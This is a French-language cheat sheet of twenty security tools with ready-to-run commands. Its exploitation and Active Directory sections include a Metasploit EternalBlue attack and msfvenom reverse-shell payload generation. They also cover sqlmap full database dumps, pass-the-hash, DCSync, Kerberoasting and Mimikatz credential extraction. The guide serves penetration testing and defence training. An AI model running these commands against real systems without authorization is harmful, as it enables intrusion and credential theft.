# Les 20 outils de cybersécurité indispensables en 2024

La cybersécurité dispose d'un arsenal d'outils considérable. Ce guide présente les 20 outils les plus importants, organisés par domaine, avec les commandes essentielles pour démarrer rapidement.

## Reconnaissance et OSINT

### Nmap — Le scanner réseau universel
```bash
# Scan rapide
nmap -sn 192.168.1.0/24              # Ping scan (hôtes actifs)
nmap -sV -sC -p- 192.168.1.100       # Scan complet avec scripts
nmap -A --min-rate 5000 192.168.1.100 # Scan agressif rapide
nmap -sU --top-ports 100 192.168.1.100 # Ports UDP

# Formats de sortie
nmap -oA scan_results 192.168.1.0/24  # Tous les formats
nmap -oX scan.xml 192.168.1.100       # XML pour import dans d'autres outils
```

### Shodan — Moteur de recherche IoT/OT
```bash
# Recherches utiles (site : shodan.io)
# port:22 country:FR city:Paris      → SSH en France
# org:"OVH SAS" port:3389            → RDP chez OVH
# vuln:CVE-2021-44228                → Serveurs Log4Shell vulnérables
# "MongoDB Server Information"       → MongoDB sans auth

# API Shodan
pip install shodan
shodan init YOUR_API_KEY
shodan host 8.8.8.8
shodan search "apache 2.2" --limit 100
```

### Subfinder + httpx — Découverte de sous-domaines
```bash
# Trouver les sous-domaines
subfinder -d target.com -o subs.txt
amass enum -passive -d target.com >> subs.txt
assetfinder target.com >> subs.txt

# Filtrer les actifs
cat subs.txt | sort -u | httpx -silent -status-code -title -o actifs.txt
```

## Tests Web

### Burp Suite — Proxy d'interception
```
Fonctionnalités clés :
→ Proxy : Intercepter et modifier les requêtes HTTP
→ Repeater : Rejouer et modifier des requêtes
→ Intruder : Fuzzing et brute force
→ Scanner (Pro) : Scan automatique de vulnérabilités
→ Collaborator : SSRF, XXE, SSTI out-of-band

Extensions indispensables :
→ Param Miner : découvrir les paramètres cachés
→ HTTP Request Smuggler : tester le request smuggling
→ JWT Editor : manipuler les tokens JWT
→ Active Scan++ : scanner amélioré
```

### SQLmap — Automatiser les injections SQL
```bash
# Test basique
sqlmap -u "http://target.com/page?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Avec authentification
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Options avancées
sqlmap -u "http://target.com/page?id=1" \
    --level=5 --risk=3 \
    --dbms=mysql \
    --dump-all \          # Dumper toutes les BDD
    --batch               # Mode non-interactif
```

### ffuf — Fuzzer rapide
```bash
# Découvrir des chemins cachés
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ

# Fuzzer des paramètres
ffuf -w params.txt -u "http://target.com/page?FUZZ=test"

# Brute force de sous-domaines
ffuf -w subdomains.txt -u http://FUZZ.target.com -H "Host: FUZZ.target.com"

# Filtrer les résultats
ffuf -w wordlist.txt -u http://target.com/FUZZ \
    -fc 404,403 \          # Filtrer codes 404, 403
    -fs 1234 \             # Filtrer par taille
    -o results.json
```

## Exploitation

### Metasploit Framework
```bash
msfconsole

# Chercher un exploit
search type:exploit name:eternalblue
search cve:2021-44228

# Utiliser un exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
show options
exploit

# Générer des payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.50 LPORT=4444 \
    -f exe -o payload.exe

# Listener
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

### Impacket — Suite d'outils AD
```bash
# Pass-the-Hash
psexec.py -hashes :NTLM_HASH DOMAIN/Administrator@192.168.1.1

# DCSync
secretsdump.py DOMAIN/admin:password@192.168.1.1

# Kerberoasting
GetUserSPNs.py DOMAIN/user:password -dc-ip 192.168.1.1 -request

# SMBclient
smbclient.py DOMAIN/user:password@192.168.1.1
```

## Active Directory

### BloodHound — Cartographie AD
```powershell
# Collecte (SharpHound sur Windows)
SharpHound.exe -c All --outputdirectory C:\Temp

# Ou avec Python (depuis Linux)
bloodhound-python -u user -p password -d DOMAIN -ns 192.168.1.1 -c all

# Dans BloodHound GUI :
# → "Shortest path to Domain Admins"
# → "Find all Domain Admins"
# → "Computers where Domain Users are Local Admins"
# → Kerberoastable Accounts
```

### Mimikatz — Extraction de credentials
```
sekurlsa::logonpasswords     # Mots de passe en clair depuis LSASS
sekurlsa::wdigest            # WDigest credentials
lsadump::sam                 # Hashes SAM
lsadump::dcsync /user:krbtgt # DCSync
kerberos::golden             # Golden Ticket
privilege::debug             # Élever les privilèges
```

## Défense et monitoring

### Wireshark — Analyse de trafic
```
Filtres essentiels :
http                          → Tout le trafic HTTP
http.request.method == "POST" → Formulaires
dns.qry.name contains "evil"  → Requêtes DNS suspectes
tcp.flags.syn == 1            → Connexions SYN
ip.addr == 192.168.1.100      → Trafic d'une IP
!(arp or dns or icmp)         → Sans le bruit
```

### Volatility — Forensics mémoire
```bash
# Identifier le profil
vol3 -f memory.dmp windows.info

# Processus
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.pstree

# Réseau
vol3 -f memory.dmp windows.netscan

# Malwares
vol3 -f memory.dmp windows.malfind
vol3 -f memory.dmp windows.dlllist --pid 1234
```

### Lynis — Audit système Linux
```bash
lynis audit system           # Audit complet
lynis show details           # Détails d'une vérification
lynis audit system --tests-from-group authentication
```

## Récapitulatif par phase

```
Reconnaissance :
→ Nmap, Shodan, Subfinder, theHarvester, Amass

Exploitation Web :
→ Burp Suite, SQLmap, ffuf, Nikto, XSSer

Exploitation Réseau/AD :
→ Metasploit, Impacket, BloodHound, Mimikatz, Rubeus

Post-exploitation :
→ Cobalt Strike/Sliver (C2), Chisel (pivoting), CrackMapExec

Défense/Forensics :
→ Wireshark, Volatility, Autopsy, Lynis, Auditd

OSINT :
→ Maltego, SpiderFoot, theHarvester, Recon-ng
```

## Conclusion

Ces 20 outils constituent la boîte à outils essentielle de tout professionnel en cybersécurité. La maîtrise de ces outils combinée à une solide compréhension des protocoles et des systèmes vous permettra d'aborder efficacement n'importe quelle mission de sécurité offensive ou défensive.

---
*Catégorie : Outils & Logiciels*
